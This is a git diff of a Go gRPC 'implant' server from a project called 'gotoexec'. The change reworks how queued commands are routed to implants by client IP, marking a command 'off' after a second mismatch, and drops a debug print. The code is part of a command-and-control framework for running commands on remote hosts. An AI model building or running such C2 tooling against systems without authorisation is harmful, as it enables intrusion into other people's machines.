@@ -4,14 +4,13 @@
  * @Autor: ABing
  * @Date: 2024-06-19 11:23:41
  * @LastEditors: lhl
- * @LastEditTime: 2024-06-20 10:19:03
+ * @LastEditTime: 2024-06-20 15:10:13
  */
 package implant
 
 import (
 	"context"
 	"errors"
-	"fmt"
 	"gotoexec/config"
 	"gotoexec/global"
 	"gotoexec/grpcapi"
@@ -31,6 +30,12 @@ func NewImplantServer(work, output chan *grpcapi.Command) *implantServer {
 	s.work = work
 	s.output = output
 	return s
+}
+
+var ipErrtime map[string]string
+
+func init() {
+	ipErrtime = make(map[string]string)
 }
 
 func (s *implantServer) FetchCommand(ctx context.Context, empty *grpcapi.Empty) (*grpcapi.Command, error) {
@@ -55,9 +60,24 @@ func (s *implantServer) FetchCommand(ctx context.Context, empty *grpcapi.Empty) 
 		if ok {
 
 			if cmd.Ip != clientIP {
+
+				errip := ipErrtime[cmd.Ip]
+
+				//这个ip已经拒绝过
+				if errip == clientIP {
+					log.Println("第二次不是我的")
+					cmd.Out = "off"
+					s.output <- cmd
+					return nil, errors.New("第二次不是我的")
+				}
+
 				s.work <- cmd
+
 				log.Println("不是客户端", clientIP, "的数据,是", cmd.Ip)
-				return cmd, errors.New("不是我的")
+
+				ipErrtime[cmd.Ip] = clientIP
+				log.Println("第一次不是我的")
+				return cmd, errors.New("第一次不是我的")
 			}
 
 			return cmd, nil
@@ -69,7 +89,6 @@ func (s *implantServer) FetchCommand(ctx context.Context, empty *grpcapi.Empty) 
 }
 func (s *implantServer) SendOutput(ctx context.Context, result *grpcapi.Command) (*grpcapi.Empty, error) {
 	s.output <- result
-	fmt.Println("result:" + result.In + result.Out)
 	return &grpcapi.Empty{}, nil
 }
 func (s *implantServer) GetSleepTime(ctx context.Context, empty *grpcapi.Empty) (*grpcapi.SleepTime, error) {
